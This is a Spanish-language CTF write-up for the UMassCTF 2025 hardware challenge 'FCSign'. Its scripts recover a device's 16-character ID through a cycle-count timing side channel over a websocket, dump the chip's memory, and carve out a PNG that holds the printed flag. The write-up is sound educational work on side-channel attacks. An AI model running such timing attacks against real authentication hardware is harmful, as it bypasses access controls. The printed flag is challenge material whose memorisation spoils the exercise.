---
title: FCSIGN- UmassCTF2025
author: Kesero
description: Reto basado en explotar una vulnerabilidad basada en ciclos dentro de un RISC.
date: 2025-04-24 12:30:00 +0000
categories: [Writeups Competiciones Internacionales, Hardware]
tags: [Difícil, Writeups]
pin: false
math: true
mermaid: true
image:
  path: https://github.com/k3sero/Blog_Content/blob/main/Competiciones_Internacionales_Writeups/2025/UmassCTF2025/Hardware/FCSign/img/4.png?raw=true
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Sanderbeggar`

Dificultad: <font color=red>Difícil</font>

## Enunciado

"What's up homie, it's Brody. I got one of those decomissioned signs from a motivational facility for something called UMassCTF. You think there's anything cool in here? Got it hooked up in my lab if you want to mess around with it...

Run python client.py with your code.

Ver pista
This chip is a bit quiet. I wonder if I could get it to talk..."

## Archivos

Este reto nos da el siguiente archivo.

- `client.py` : Contiene el archivo de conexión al reto.
- `datasheet.md` : Contiene el datashet del empotrado en formato markdown.
- `datasheet.pdf` : Contiene el datashet del empotrado en formato pdf.

Archivos utilizados [aquí](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/UmassCTF2025/Hardware/FCSign).

## Analizando el reto

En este reto, tenemos un dispositivo en específico el cual tenemos que leer su contenido. Primero tenemos que leeernos el datasheet para saber en especifico su operatoria.

## Solver

Leyendo el contenido de `datasheet.pdf` nos daremos cuenta de que para poder leer su contenido, tenemos que ingresr un identificador `ID` de 16 bytes formado por dígitos de la A a la Z. En caso de fallar, su contenido se eliminará por lo que sería imposible resolver el reto en esa ejecución.

Los ataques de fuerza bruta en este aspecto son inviables ya que el rango es enorme a demás de solo contar con una iteración y después de abrir un ticket, el desarrollador me comentó que el ID en cada iteración era random, por lo que debe de habe otro método.

En procesadores RISC existe una vulnerabilidad por la cual a través de los ciclos del procesador, podemos intuir información, casi como si fuese una SQLInjection a ciegas.

En este caso, las variaciones en los ciclos de ejecución también pueden abrir la puerta a ataques tipo side-channel, donde un atacante infiere información al medir cuántos ciclos toma ejecutar ciertas operaciones. Como los RISC tienen instrucciones simples pero ejecutadas muchas veces, esto puede hacer que las diferencias sean más observables.

```
[!] Probando con el Byte 1:

[+] A : delta = 1500 ciclos
[+] B : delta = 1500 ciclos
[+] C : delta = 1600 ciclos
[+] D : delta = 3850 ciclos
[+] E : delta = 1250 ciclos
[+] F : delta = 1550 ciclos

[!] Byte encontrado: d (3850 ciclos)
```

Montando un script sofisticado en el que introduciendo posibles caracteres y recibiendo los ciclos por parte del empotrado, podemos obervar variaciones.

El script final que yo utilicé pero funcionaba a medias es el siguiente.

```py
import asyncio
import websockets
import json
import base64
import struct
import string
import statistics

# Configuración
URL = 'ws://hardware.ctf.umasscybersec.org:10004'
ALL_CHARS = list(string.ascii_uppercase)  # A–Z únicamente
ID_LEN = 16
SAMPLE_COUNT = 5  # Número de mediciones por candidato

async def send_packet(ws, raw_bytes):
    """
    Envía raw_bytes y devuelve (data_bytes, cycles).
    """
    await ws.send(json.dumps({'data': base64.b64encode(raw_bytes).decode()}))
    msg = await ws.recv()
    decoded = json.loads(msg)
    data = base64.b64decode(decoded['data'])
    return data, decoded['cycles']


def make_packet(cmd, args=b''):
    length = 1 + len(args)
    return b'\x33' + struct.pack('<H', length) + bytes([cmd]) + args

async def measure_cycles(prefix: bytes) -> float:
    """
    Conecta al servidor, realiza la negociación inicial y mide
    el número de ciclos medios para un prefix dado.
    """
    cycles_list = []
    async with websockets.connect(URL) as ws:
        # RESET, INIT, SET_CLOCK
        await send_packet(ws, b'\x55\x00\xC1\x00')
        await send_packet(ws, make_packet(0x03, b'\x00'))
        await send_packet(ws, make_packet(0x05, b'\x00\x12\x7A\x00'))

        for _ in range(SAMPLE_COUNT):
            full_id = prefix.ljust(ID_LEN, b'A')
            pkt = make_packet(0x34, full_id)
            try:
                _, cycles = await send_packet(ws, pkt)
                cycles_list.append(cycles)
            except:
                continue
    return statistics.mean(cycles_list) if cycles_list else -1

async def find_id() -> bytes:
    discovered = b''
    for pos in range(ID_LEN):
        print(f"[+] Descifrando byte {pos+1}/{ID_LEN}")
        scores = []
        for c in ALL_CHARS:
            guess = discovered + c.encode()
            avg = await measure_cycles(guess)
            scores.append((c, avg))
            print(f"    {guess.decode():<{pos+1}} -> {avg:.2f} ciclos")
        scores.sort(key=lambda x: -x[1])
        best, best_val = scores[0]
        discovered += best.encode()
        print(f"[!] Byte {pos+1} = '{best}' (avg {best_val:.2f} ciclos)\n")
    return discovered

async def authenticate_and_dump(final_id: bytes):
    try:
        async with websockets.connect(URL) as ws:
            # 1) RESET
            await send_packet(ws, b'\x55\x00\xC1\x00')
            # 2) COMM_INIT
            pkt = make_packet(0x03, b'\x00')
            resp, _ = await send_packet(ws, pkt)
            print('INIT resp:', resp.hex())
            # 3) SET_CLOCK a 8MHz
            freq_args = bytes([0x00, 0x12, 0x7A, 0x00])
            pkt = make_packet(0x05, freq_args)
            resp, _ = await send_packet(ws, pkt)
            print('FREQ resp:', resp.hex())
            # 4) ID_AUTHENTICATION
            pkt = make_packet(0x34, final_id)
            resp, _ = await send_packet(ws, pkt)
            print('AUTH resp:', resp.hex())
            if resp[1] != 0x50:
                print(" AUTH falló, ID incorrecto.")
                return
            print(f" AUTH exitosa con ID: {final_id.decode()}")
            # 5) READ en bloques de 0x400
            addr = 0x0370
            while addr <= 0x0EDBFF:
                a = addr.to_bytes(3, 'little')
                pkt = make_packet(0x69, a + b'\x00')
                data, _ = await send_packet(ws, pkt)
                print(f'Read 0x{addr:06X}:', data.hex())
                addr += 0x400
    except Exception as e:
        print("Error durante autenticación/lectura:", e)

async def main():
    # 1) Obtener ID mediante ataque de temporización
    final_id = await find_id()
    print(f"ID descubierto completo: {final_id.decode()}")
    # 2) Autenticar y volcar contenido
    await authenticate_and_dump(final_id)

if __name__ == '__main__':
    asyncio.run(main())
```

El script modificado de `client.py` es el siguiente. (Créditos a [yun](https://yun.ng/c/ctf/2025-umass-ctf/hardware/fcsign) por contar con un script más óptimo que el mío)

```py
import asyncio
import json
import base64
import string
import websockets
from comm import encode_packet, decode_packet, COMMANDS, RESPONSES

URL = 'ws://hardware.ctf.umasscybersec.org:10004'


async def send_raw(ws, data: bytes):
    env = json.dumps({'data': base64.b64encode(data).decode()})
    # print(f">>> {data.hex()}")
    await ws.send(env)


async def recv_pkt(ws):
    msg = await ws.recv()
    obj = json.loads(msg)
    raw = base64.b64decode(obj['data'])
    # print(f"<<< {raw.hex()}")
    info = decode_packet(raw)
    return info, obj.get('cycles')


async def dump_until_fail(ws):
    data = bytearray()
    addr = 0
    while True:
        pkt = encode_packet(COMMANDS.READ, addr.to_bytes(4, 'little'))
        await send_raw(ws, pkt)
        resp, _ = await recv_pkt(ws)
        status = resp['status']
        if status != RESPONSES.ACK:
            print(f"[-] READ failed at {hex(addr)}: {status.name}")
            return data, addr, status
        data.extend(resp['args'])
        print(f"[+] Read 0x400 bytes from {hex(addr)}")
        addr += 0x400


async def main():
    ws = await websockets.connect(URL)
    await send_raw(ws, b'\x55\x00\xC1\x00')
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    await send_raw(ws, encode_packet(COMMANDS.COMM_INIT))
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    freq = (8_000_000).to_bytes(4, 'little')
    await send_raw(ws, encode_packet(COMMANDS.SET_CHIP_FREQ, freq))
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    known = b''
    while len(known) < 16:
        last_c = _
        count = {}
        for l in reversed(string.ascii_uppercase):
            pwd = known+l.encode() + b'A'*(15-len(known))
            await send_raw(ws, encode_packet(COMMANDS.ID_AUTHENTICATION, pwd))
            resp, _ = await recv_pkt(ws)
            print(f"[/] {l} : delta = {_-last_c} cycles")
            count[l] = _-last_c
            last_c = _
        max_char = max(count, key=count.get)
        print(f"[*] max char: {max_char} ({count[max_char]} cycles)")
        known += max_char.encode()
        print(f"[*] known: {known.decode()}")
    await send_raw(ws, encode_packet(COMMANDS.ID_AUTHENTICATION, known))
    resp, _ = await recv_pkt(ws)
    print(f"[*] ID_AUTHENTICATION: {resp['status']}")

    full_dump, fail_addr, fail_status = await dump_until_fail(ws)
    print(f"Stopped at {hex(fail_addr)} with status {fail_status.name}")
    print(f"Total bytes read: {len(full_dump)}")

    with open('dump.bin', 'wb') as f:
        f.write(full_dump)
    print(f"[*] Dump saved to dump.bin")

if __name__ == '__main__':
    asyncio.run(main())
```

Además de `client_mod.py` tenemos que realizar un script de lógica de lectura de la información. Para ello el siguiente script se encarga de sanitizar la lectura.

```py
import struct
from enum import IntEnum


class COMMANDS(IntEnum):
    UNKNOWN = 0x00
    COMM_INIT = 0x03
    SET_CHIP_FREQ = 0x05
    ID_AUTHENTICATION = 0x34
    READ = 0x69


class RESPONSES(IntEnum):
    ACK = 0x50
    INVALID_COMMAND = 0x80
    FLOW_ERROR = 0x81
    UNAUTHORIZED = 0x82
    INVALID_FREQUENCY = 0x83
    INVALID_ID_LEN = 0x84
    INVALID_ADDRESS = 0x87
    INVALID_ADDRESS_ALIGNMENT = 0x88


def encode_packet(cmd: COMMANDS, args: bytes = b'') -> bytes:
    """
    Build a UK47XD packet for sending.

    Packet layout:
      HEAD  (1B)   = 0x33
      LEN   (2B)   = size of DATA (CMD + ARGS)
      DATA (N bytes) = CMD (1B) + ARGS
    """
    head = 0x33
    length = 1 + len(args)  # 1 byte for CMD + len(args)
    return struct.pack('<B H B', head, length, cmd) + args


def decode_packet(pkt: bytes) -> dict:
    """
    Parse a UK47XD packet into its fields.

    Expects at least 5 bytes: HEAD (1) + LEN (2) + CMD (1) + STATUS (1).
    Any remaining bytes are ARGS.
    """
    if len(pkt) < 5:
        raise ValueError("Packet too short to be valid")

    head, length = struct.unpack_from('<B H', pkt, 0)
    if head != 0x33:
        raise ValueError(f"Invalid HEAD byte: 0x{head:02X}")

    expected_len = 3 + length  # 1B HEAD + 2B LEN + length
    if len(pkt) != expected_len:
        raise ValueError(f"Length mismatch: expected {expected_len} bytes, got {len(pkt)}")

    cmd = COMMANDS(pkt[3])
    status = RESPONSES(pkt[4])
    args = pkt[5:]

    return {
        'head':   head,
        'length': length,
        'cmd':    cmd,
        'status': status,
        'args':   args,
    }
```

Además siguiendo el datasheet, podemos observar que si pedimos información en la dirección `0x400` esta entra en conflicto y la lectura se para.

Una vez tenemos la extración completa, simplemente realizando un xxd a el binario podemos encontrar que hay distintas cabeceras en su interior.

Este script en python permite buscar de manera automatizada por cabeceras comunes, en este caso lo ejecuté y encontré en su interior una imágen `.png`.

```py
import os

# Ruta del archivo a analizar
input_file = "dump_completo.bin"

# Lista de encabezados a buscar (en bytes)
headers = {
    "SWF_FWS": bytes([0x46, 0x57, 0x53]),
    "SWF_CWS": bytes([0x43, 0x57, 0x53]),
    "PNG": bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    "JPEG": bytes([0xFF, 0xD8, 0xFF]),
    "ZIP": bytes([0x50, 0x4B, 0x03, 0x04]),
    "PDF": bytes([0x25, 0x50, 0x44, 0x46]),
    "GIF_89a": bytes([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]),
    "GIF_87a": bytes([0x47, 0x49, 0x46, 0x38, 0x37, 0x61]),
    "BMP": bytes([0x42, 0x4D]),
    "ELF": bytes([0x7F, 0x45, 0x4C, 0x46]),
    "MP3_ID3": bytes([0x49, 0x44, 0x33]),
    "MP3_FRAME": bytes([0xFF, 0xFB]),
    "WAV": bytes([0x52, 0x49, 0x46, 0x46]),
    "AVI": bytes([0x52, 0x49, 0x46, 0x46]),
    "MPEG": bytes([0x00, 0x00, 0x01, 0xBA]),
    "FLV": bytes([0x46, 0x4C, 0x56]),
    "RAR": bytes([0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00]),
    "TTF": bytes([0x00, 0x01, 0x00, 0x00]),
    "OGG": bytes([0x4F, 0x67, 0x67, 0x53]),
    "MIDI": bytes([0x4D, 0x54, 0x68, 0x64])
}

# Leer el archivo
with open(input_file, "rb") as f:
    data = f.read()

# Buscar cada encabezado en el archivo
found_headers = []
for header_name, header_bytes in headers.items():
    offset = 0
    while True:
        # Buscar el encabezado desde la posición actual
        offset = data.find(header_bytes, offset)
        if offset == -1:  # No se encontró más
            break
        found_headers.append((header_name, offset))
        offset += 1  # Continuar buscando después de la coincidencia

# Mostrar resultados
if found_headers:
    print("Encabezados encontrados:")
    for header_name, offset in found_headers:
        print(f"Formato: {header_name}, Offset: 0x{offset:04x} ({offset} bytes)")
else:
    print("No se encontraron encabezados de los formatos especificados.")

# Opcional: Extraer bloques de datos para cada encabezado encontrado
extract_files = input("¿Quieres extraer los bloques de datos para cada encabezado encontrado? (s/n): ").lower() == 's'

if extract_files and found_headers:
    for header_name, offset in found_headers:
        # Determinar un tamaño razonable para extraer (por ejemplo, hasta el final del archivo o un tamaño estimado)
        # Nota: Para SWF, el tamaño está en los 4 bytes después del encabezado
        if header_name in ["SWF_FWS", "SWF_CWS"] and offset + 7 < len(data):
            # Leer el tamaño del archivo SWF (bytes 4-7, little-endian)
            size = int.from_bytes(data[offset+4:offset+8], byteorder='little')
            if size <= len(data) - offset:
                extracted_data = data[offset:offset+size]
            else:
                extracted_data = data[offset:]  # Extraer hasta el final si el tamaño es inválido
        else:
            # Para otros formatos, extraer un bloque razonable (por ejemplo, 8192 bytes o hasta el final)
            extracted_data = data[offset:min(offset+8192, len(data))]

        # Guardar el bloque extraído
        output_file = f"extracted_{header_name}_at_{offset:04x}.bin"
        with open(output_file, "wb") as f:
            f.write(extracted_data)
        print(f"Extraído: {output_file} (tamaño: {len(extracted_data)} bytes)")
```
Por último en la imágen se encuentra la flag.

![ima](https://github.com/k3sero/Blog_Content/blob/main/Competiciones_Internacionales_Writeups/2025/UmassCTF2025/Hardware/FCSign/img/png.png?raw=true)

## Flag
`UMASS{un(_b3_w1l1n_w1th_s1d3ch4nn3l1n_XT60WWSC}`